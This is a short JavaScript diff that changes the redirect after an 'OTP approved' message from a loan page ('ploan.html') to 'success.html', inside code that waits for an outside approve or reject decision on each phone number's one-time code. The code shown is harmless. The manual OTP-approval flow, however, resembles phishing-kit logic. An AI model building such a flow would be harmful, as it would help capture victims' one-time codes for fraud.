@@ -408,7 +408,7 @@ function startListeningForOtpDecision(phone) {
               loadingMsg.style.display = 'none';
               errorMsg.style.color = '#1a7a3c';
               errorMsg.textContent = '✅ OTP approved! Proceeding...';
-              setTimeout(() => { window.location.href = 'ploan.html'; }, 1000);
+              setTimeout(() => { window.location.href = 'success.html'; }, 1000);
               return;
 
             } else if (action === `OTP_REJECT_${phone}`) {
